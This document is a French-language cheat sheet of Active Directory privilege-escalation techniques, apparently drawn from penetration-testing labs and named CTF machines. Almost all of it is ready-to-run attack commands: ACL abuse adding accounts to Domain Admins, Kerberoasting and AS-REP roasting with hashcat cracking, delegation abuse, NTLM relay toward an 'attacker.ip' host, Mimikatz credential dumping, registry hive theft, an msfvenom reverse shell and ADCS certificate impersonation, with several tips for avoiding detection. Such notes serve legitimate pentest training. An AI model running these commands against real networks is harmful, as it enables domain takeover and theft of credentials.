# Techniques d'Élévation de Privilèges

### Exploitation des ACLs Vulnérables

#### ForceChangePassword (Reset Password)

```powershell
# Créer un objet d'identifiants pour l'utilisateur actuel
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\user1', $SecPassword)

# Définir le nouveau mot de passe pour la cible
$NewPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force

# Forcer le changement de mot de passe
Set-DomainUserPassword -Identity targetuser -AccountPassword $NewPassword -Credential $Cred -Verbose
```

#### GenericAll sur un utilisateur

```powershell
# Changer le mot de passe
Set-DomainUserPassword -Identity targetuser -AccountPassword $NewPassword -Credential $Cred -Verbose

# Ajouter à un groupe privilégié
Add-DomainGroupMember -Identity 'Domain Admins' -Members targetuser -Credential $Cred -Verbose
```

#### GenericAll sur un groupe

```powershell
# Ajouter un utilisateur contrôlé à un groupe
Add-DomainGroupMember -Identity 'IT Admins' -Members controlleduser -Credential $Cred -Verbose
```

#### WriteDACL sur un objet

```powershell
# Attribuer GenericAll à un utilisateur contrôlé
Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity controlleduser -Rights All -Credential $Cred -Verbose
```

#### Exploitation de Kerberoasting avec GenericAll

```powershell
# Définir un SPN sur un compte cible
Set-DomainObject -Credential $Cred -Identity targetuser -SET @{serviceprincipalname='fake/LEGIT'} -Verbose

# Exécuter Kerberoasting sur ce compte
.\Rubeus.exe kerberoast /user:targetuser /nowrap
```

### Kerberoasting

#### Identification des cibles

```powershell
# Avec PowerView
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# Avec setspn.exe (natif)
setspn -F -Q */* | findstr /i "cn="
```

#### Extraction des tickets TGS

```powershell
# Avec Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Avec PowerView
Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty hash | Out-File -Encoding ASCII hashes.txt
```
#### Depuis Linux

```bash
# Avec Impacket
GetUserSPNs.py -request -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/username:password

# Craquage avec Hashcat (mode 13100)
hashcat -m 13100 hashes.txt wordlist.txt --force
```

### AS-REP Roasting
#### Identification des cibles
```powershell
# Avec PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname

# En LDAP
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | select name
```
#### Extraction des tickets AS-REP
```powershell
# Avec Rubeus pour tous les utilisateurs vulnérables
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Pour un utilisateur spécifique
.\Rubeus.exe asreproast /user:target /format:hashcat /outfile:asrep.txt
```
### Depuis Linux
```bash
# Avec Impacket
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -request -format hashcat

# Craquage avec Hashcat (mode 18200)
hashcat -m 18200 asrep.txt wordlist.txt --force
```
### Délégation Kerberos

#### Délégation non contrainte

```powershell
# Identifier les serveurs avec délégation non contrainte
Get-DomainComputer -Unconstrained | select name

# Avec mimikatz, une fois l'accès obtenu au serveur avec délégation
sekurlsa::tickets /export
kerberos::ptt ticket.kirbi
```
### Délégation contrainte
```powershell
# Identifier les délégations contraintes
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto

# Exploiter avec Rubeus si vous avez l'accès au compte
.\Rubeus.exe s4u /user:serviceaccount$ /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/targetserver.domain.com /altservice:LDAP,HOST,HTTP /ptt
```
### Exploitation Exchange/ADCS
#### Exchange (PrivExchange)

```bash
# Utiliser ntlmrelayx pour capturer l'authentification Exchange
ntlmrelayx.py -t ldap://dc.inlanefreight.local --escalate-user compromiseduser

# Déclencher l'authentification
python privexchange.py -ah attacker.ip -u compromiseduser -d inlanefreight.local -p Password123! exchange.inlanefreight.local
```
#### Exploitation ADCS (ESC8)
```bash
# Configuration du relais
ntlmrelayx.py -t http://ca.inlanefreight.local/certsrv/certfnsh.asp --adcs --template DomainController

# Déclencher l'authentification (Printer Bug ou PetitPotam)
python PetitPotam.py -d inlanefreight.local -u user -p password attacker.ip dc.inlanefreight.local
```
### Extraction de Credentials en Mémoire

#### Mimikatz

```powershell
# Élever les privilèges
privilege::debug

# Extraire les mots de passe en mémoire
sekurlsa::logonpasswords

# Extraire les tickets Kerberos
sekurlsa::tickets /export
```

#### Avec Invoke-Mimikatz à distance

```powershell
# Exécution à distance via PowerShell
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' -ComputerName target.inlanefreight.local
```
## Points Clés

- Documenter tous les chemins d'élévation de privilèges découverts
- Tenter les méthodes les moins intrusives en premier
- Vérifier les événements de sécurité pour éviter la détection
- Pour les tests d'intrusion réels, coordonner avec l'équipe de sécurité avant d'exploiter des ACLs critiques

## Techniques d'élévation de privilèges Windows tirées de CTFs réels
#### Abus des privilèges SeBackup et SeRestore (Vault)

Ces privilèges peuvent être exploités pour accéder à des fichiers protégés:
#### SeBackupPrivilege
Permet de contourner les contrôles d'accès pour lire n'importe quel fichier:
```powershell 
# Vérifier les privilèges
whoami /priv

# Sauvegarder les hives de registre (contenant les hachages de mots de passe)
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save

# Offline dumping of SAM & LSA secrets from exported hives
secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL

```
#### SeRestorePrivilege 
Permet de remplacer des fichiers critiques du système:
```powershell
# Création d'un reverse shell avec msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.x LPORT=80 -f exe -o reverse.exe

# Utilisation d'un exploit SeRestore pour exécuter le reverse shell
SeRestoreAbuse.exe "C:\chemin\absolu\vers\reverse.exe"
```
#### Exploitation des identifiants mis en cache (Access)
Vérifier les identifiants stockés avec `cmdkey`:

```powershell
cmdkey /list
```
Si des identifiants administrateur sont stockés, ils peuvent être exploités avec `runas`:
```powershell
C:\Windows\System32\runas.exe /user:DOMAINE\Utilisateur /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\utilisateur\root.txt"
```
#### Historique PowerShell (Timelapse)
PowerShell conserve un historique des commandes qui peut contenir des mots de passe:

```powershell
# Pour un utilisateur spécifique
Get-ChildItem -Path C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Force

# Pour tous les profils utilisateurs
Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Force
```

Ce fichier peut contenir des commandes PowerShell exécutées précédemment, y compris des commandes avec des mots de passe en clair. Vérifiez toujours ce fichier lors de vos recherches d'informations d'identification.
## Exploitation des templates vulnérables tirée de CTFs réels
#### Usurpation d'identité par UserPrincipalName (UPN) (Certified)

Si un utilisateur a des droits sur un autre utilisateur, il peut modifier son UPN pour obtenir un certificat administrateur:

```bash
# Modifier l'UPN d'un utilisateur pour le faire correspondre à celui de l'administrateur
certipy account update -u utilisateur@domaine -hashes <hash> -user cible -upn administrator

# Demander un certificat avec le template vulnérable
certipy req -username utilisateur@domaine -hashes <hash> -ca CERT-CA -template Template -dc-ip 10.10.10.x -pfx admin.pfx

# Restaurer l'UPN d'origine (important pour éviter la détection)
certipy account update -u utilisateur@domaine -hashes <hash> -user cible -upn cible@domaine

# Utiliser le certificat pour obtenir un TGT d'administrateur
certipy auth -pfx admin.pfx

# Passer le hash pour une session administrative
evil-winrm -i 10.10.10.x -u administrator -H <hash obtenu>
```

Cette technique exploite le fait que la CA vérifie l'UPN dans le certificat, pas l'utilisateur réel demandant le certificat. En modifiant temporairement l'UPN d'un utilisateur contrôlé pour qu'il corresponde à celui de l'administrateur, nous pouvons obtenir un certificat pour l'administrateur.
#### Shadow Credentials pour élévation de privilèges (Certified)
Si vous avez des droits sur un objet utilisateur, vous pouvez ajouter une clé alternative pour l'impersonation:
```bash
# Ajouter une clé DACL et générer un certificat
certipy shadow auto -u utilisateur@domaine -hashes <hash> -account cible

# Résultat: hachage NTLM de l'utilisateur cible
# Peut être utilisé pour l'authentification Pass-the-Hash
```